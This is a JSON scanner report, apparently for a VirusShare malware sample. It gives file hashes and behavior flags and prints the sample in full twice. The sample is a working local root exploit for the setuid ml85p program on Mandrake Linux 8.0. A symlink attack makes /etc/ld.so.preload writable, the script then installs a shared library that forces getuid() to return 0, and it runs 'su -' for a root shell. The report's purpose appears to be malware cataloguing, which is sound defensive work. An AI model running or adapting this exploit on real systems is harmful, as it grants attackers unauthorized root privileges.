{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "Why code the exploit in C if you were just going to sprintf(); system() \neverything anyway? This is a bad exploit for a lame bug. I found this in april \nand wrote this exploit to muck around with /etc/ld.so.preload as a means of \nelevating privildges from symlink attacks locally. old news but still. this \nml85 bug appears in Linux Mandrake 8.0. Thing is, this program is mode 4750 \nroot:sys so whatever...\n\nsuid\n\n----\n\n#!/bin/sh\n# Exploit using /usr/bin/ml85p default setuid program on \n# Mandrake Linux 8.0\n#\n# You need to be in the sys group to be able to execute \n# ml85p.\n\necho \"** ml85p exploit\"\n# set the required umask\numask 0\n\n# get the number of seconds since 1970\nDATE=`date +\"%s\"`\nif [ ! -u /usr/bin/ml85p ] || [ ! -x /usr/bin/ml85p ]\nthen\n        echo \"** this exploit requires that /usr/bin/ml85p is setuid and \nexecutable.\"\n        exit 1\nfi\n\nif [ ! -e /etc/ld.so.preload ] || [ ! -w /etc/ld.so.preload ]\nthen\n        echo \"** this exploit requires that /etc/ld.so.preload does not exist.\"\n        exit 1\nfi\n\necho \"** creating file\"\nln -s /etc/ld.so.preload /tmp/ml85g\"$DATE\"\necho \"bleh\" | /usr/bin/ml85p -s\nrm /tmp/ml85g\"$DATE\"\n\necho \"** creating shared library\"\ncat << _EOF_ > /tmp/g.c\nint getuid(void) { return(0); }\n_EOF_\n\necho \"** compiling and linking shared object\"\ngcc -c -o /tmp/g.o /tmp/g.c\nld -shared -o /tmp/g.so /tmp/g.o\nrm -f /tmp/g.c /tmp/g.o\n\necho \"** rigging ld.so.preload\"\necho \"/tmp/g.so\" > /etc/ld.so.preload\necho \"** execute su. warning all getuid() calls will return(0) until you remove\"\necho \"** the line \\\"/tmp/g.so\\\" from /etc/ld.so.preload. removing /tmp/g.so \nwithout\"\necho \"** first fixing /etc/ld.so.preload may result in system malfunction\"\nsu -\necho \"** cleaning up\"\n> /etc/ld.so.preload\nrm -f /tmp/g.so"
    },
    "filename": "VirusShare_27106ddc98e2b944324483817b655184",
    "filesize": 1751,
    "filetype": "ASCII text",
    "hashes": {
        "md5": "27106ddc98e2b944324483817b655184",
        "sha1": "5e5daf9da82681302736cb99fdfc177adfb3263c",
        "sha256": "7fc636ec99a7121c1576f6a3baa4cfa2f6d10bc5a5797fccdad14335a04ae46a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Why code the exploit in C if you were just going to sprintf(); system() ",
            "everything anyway? This is a bad exploit for a lame bug. I found this in april ",
            "and wrote this exploit to muck around with /etc/ld.so.preload as a means of ",
            "elevating privildges from symlink attacks locally. old news but still. this ",
            "ml85 bug appears in Linux Mandrake 8.0. Thing is, this program is mode 4750 ",
            "root:sys so whatever...",
            "suid",
            "----",
            "#!/bin/sh",
            "# Exploit using /usr/bin/ml85p default setuid program on ",
            "# Mandrake Linux 8.0",
            "# You need to be in the sys group to be able to execute ",
            "# ml85p.",
            "echo \"** ml85p exploit\"",
            "# set the required umask",
            "umask 0",
            "# get the number of seconds since 1970",
            "DATE=`date +\"%s\"`",
            "if [ ! -u /usr/bin/ml85p ] || [ ! -x /usr/bin/ml85p ]",
            "then",
            "        echo \"** this exploit requires that /usr/bin/ml85p is setuid and ",
            "executable.\"",
            "        exit 1",
            "if [ ! -e /etc/ld.so.preload ] || [ ! -w /etc/ld.so.preload ]",
            "then",
            "        echo \"** this exploit requires that /etc/ld.so.preload does not exist.\"",
            "        exit 1",
            "echo \"** creating file\"",
            "ln -s /etc/ld.so.preload /tmp/ml85g\"$DATE\"",
            "echo \"bleh\" | /usr/bin/ml85p -s",
            "rm /tmp/ml85g\"$DATE\"",
            "echo \"** creating shared library\"",
            "cat << _EOF_ > /tmp/g.c",
            "int getuid(void) { return(0); }",
            "_EOF_",
            "echo \"** compiling and linking shared object\"",
            "gcc -c -o /tmp/g.o /tmp/g.c",
            "ld -shared -o /tmp/g.so /tmp/g.o",
            "rm -f /tmp/g.c /tmp/g.o",
            "echo \"** rigging ld.so.preload\"",
            "echo \"/tmp/g.so\" > /etc/ld.so.preload",
            "echo \"** execute su. warning all getuid() calls will return(0) until you remove\"",
            "echo \"** the line \\\"/tmp/g.so\\\" from /etc/ld.so.preload. removing /tmp/g.so ",
            "without\"",
            "echo \"** first fixing /etc/ld.so.preload may result in system malfunction\"",
            "su -",
            "echo \"** cleaning up\"",
            "> /etc/ld.so.preload",
            "rm -f /tmp/g.so"
        ],
        "file": {
            "rm -f /tmp/g.so": "Executable"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.284824",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
